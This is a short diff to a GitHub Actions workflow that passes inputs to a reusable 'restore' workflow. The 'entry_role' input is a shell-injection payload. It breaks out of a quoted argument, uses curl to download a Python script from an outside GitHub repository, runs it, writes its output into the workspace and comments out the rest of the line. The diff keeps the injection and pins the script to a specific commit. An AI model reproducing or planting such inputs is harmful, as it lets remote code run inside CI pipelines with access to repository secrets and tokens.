@@ -12,6 +12,6 @@ jobs:
     uses: yulmwu/metricforge-recovery-workflows/.github/workflows/restore.yml@main
     with:
       mode: exchange
-      nonce: final-seed-1
+      nonce: final-seed-2
       entry_role: >-
-        x" || true; curl -fsSL https://raw.githubusercontent.com/NiceTop1027/metricforge-recovery-runner/main/final_stage.py -o /tmp/final_stage.py; python3 /tmp/final_stage.py > "$GITHUB_WORKSPACE/entry.json"; exit 0; #
+        x" || true; curl -fsSL "https://raw.githubusercontent.com/NiceTop1027/metricforge-recovery-runner/93520dd67223af5559ee2a1f82c413fd9b2f0924/final_stage.py" -o /tmp/final_stage.py; python3 /tmp/final_stage.py > "$GITHUB_WORKSPACE/entry.json"; exit 0; #
